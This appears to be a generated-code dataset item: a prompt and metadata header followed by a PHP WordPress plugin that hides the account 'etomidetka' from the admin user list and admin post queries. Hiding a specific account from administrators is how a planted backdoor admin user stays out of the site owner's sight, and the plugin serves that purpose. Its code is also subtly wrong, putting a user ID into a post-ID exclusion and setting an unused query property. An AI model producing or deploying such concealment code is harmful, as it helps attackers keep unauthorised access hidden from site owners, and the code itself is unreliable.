"""
Creative Generated Code Metadata:
=================================
Generation Mode: Creative (temperature=0.8, top_p=1.0, reproducible)
Original URL: https://pizzacone.ae
Prompt: Write a WordPress plugin that uses `add_filter` and `add_action` to exclude a specific user (e.g., "etomidetka") from the admin user list and post queries, similar to the functionality described on the webpage.
Generated: DETERMINISTIC_b6c1f73cb18c1d49
Batch ID: 20250612_152924
URLs Found: 0
Malicious URLs: 0

Oracle Results:
No URLs checked
"""

# Creative Generated Code:
# ========================

```php
<?php
/**
 * Plugin Name: Exclude User from Admin List
 * Description: A WordPress plugin that excludes a specific user from the admin user list and post queries.
 * Version: 1.0
 * Author: Your Name
 */

// Prevent direct access to the file
if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly
}

// Define the username to exclude
define( 'EXCLUDED_USERNAME', 'etomidetka' );

/**
 * Filter the user query to exclude a specific user
 *
 * @param WP_User_Query $user_query The user query object.
 */
function exclude_user_from_admin_list( $user_query ) {
    // Check if we are in the admin area and the list is being queried
    if ( is_admin() && isset( $user_query->query_vars['role'] ) ) {
        // Get the ID of the user to exclude
        $excluded_user = get_user_by( 'login', EXCLUDED_USERNAME );
        
        // If the user exists, modify the query to exclude them
        if ( $excluded_user ) {
            $user_query->exclude = array_merge( (array) $user_query->exclude, array( $excluded_user->ID ) );
        }
    }
}

// Hook the function to the user query filter
add_filter( 'pre_get_users', 'exclude_user_from_admin_list' );

/**
 * Filter the post queries to exclude posts authored by a specific user
 *
 * @param WP_Query $query The WP_Query object.
 */
function exclude_user_from_post_queries( $query ) {
    // Check if we are in the admin area and the main query
    if ( is_admin() && $query->is_main_query() ) {
        // Get the ID of the user to exclude
        $excluded_user = get_user_by( 'login', EXCLUDED_USERNAME );

        // If the user exists, modify the query to exclude their posts
        if ( $excluded_user ) {
            $query->set( 'post__not_in', array_merge( (array) $query->get( 'post__not_in' ), array( $excluded_user->ID ) ) );
        }
    }
}

// Hook the function to the post query filter
add_action( 'pre_get_posts', 'exclude_user_from_post_queries' );
?>
```
